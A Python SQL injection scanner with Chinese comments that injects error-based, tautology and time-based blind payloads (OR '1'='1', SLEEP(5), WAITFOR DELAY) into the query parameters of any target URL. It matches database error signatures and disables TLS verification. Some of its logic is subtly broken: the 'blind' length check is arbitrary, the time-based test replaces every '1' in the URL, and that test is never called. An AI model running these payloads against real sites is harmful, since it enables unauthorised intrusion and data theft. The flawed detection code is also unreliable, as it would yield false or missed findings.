#!/usr/bin/env python3
"""
SQL注入检测脚本
用法: python sql_injection_scanner.py http://target.com/page?id=1
"""

import sys
import requests
import urllib3
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SQL注入测试 payloads
PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "1' AND '1'='1",
    "1\" AND \"1\"=\"1",
]

# 错误特征
ERROR_PATTERNS = [
    "SQL syntax",
    "MySQL",
    "Warning: mysql",
    "mysql_fetch_array",
    "mysql_num_rows",
    "mysql_result",
    "MySQLSyntaxErrorException",
    "ORA-",
    "Microsoft SQL Native Client error",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "PostgreSQL",
    "pg_fetch_array",
    "Warning: pg_",
    "valid PostgreSQL result",
    "Apache Derby",
    "SQLite/JDBCDriver",
    "System.Data.SQLite.SQLiteException",
]


def check_sql_injection(url):
    """检测URL是否存在SQL注入"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[!] URL中没有参数")
        return False
    
    print(f"[*] 目标: {url}")
    print(f"[*] 参数: {list(params.keys())}")
    
    # 测试每个参数
    for param in params:
        print(f"\n[*] 测试参数: {param}")
        
        for payload in PAYLOADS:
            # 构造测试URL
            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
            
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                # 检查错误特征
                for pattern in ERROR_PATTERNS:
                    if pattern.lower() in response.text.lower():
                        print(f"[+] 发现SQL注入! Payload: {payload}")
                        print(f"[+] 错误特征: {pattern}")
                        return True
                
                # 检查布尔盲注（比较响应长度）
                if len(response.text) > 10000:
                    print(f"[?] 响应异常，长度: {len(response.text)}")
                    
            except requests.exceptions.Timeout:
                print(f"[x] 请求超时")
            except requests.exceptions.RequestException as e:
                print(f"[x] 请求失败: {e}")
    
    print("\n[-] 未发现SQL注入")
    return False


def blind_injection_test(url):
    """时间盲注测试"""
    print("\n[*] 测试时间盲注...")
    
    payloads = [
        "' AND SLEEP(5)--",
        "' AND SLEEP(5) AND '1'='1",
        "'; WAITFOR DELAY '00:00:05'--",
    ]
    
    for payload in payloads:
        try:
            print(f"[*] 测试: {payload}")
            response = requests.get(url.replace("1", payload), timeout=10)
            
            if response.elapsed.total_seconds() > 4:
                print(f"[+] 发现时间盲注! Payload: {payload}")
                return True
                
        except:
            pass
    
    return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python sql_injection_scanner.py <目标URL>")
        print("示例: python sql_injection_scanner.py http://target.com/page?id=1")
        sys.exit(1)
    
    target = sys.argv[1]
    check_sql_injection(target)
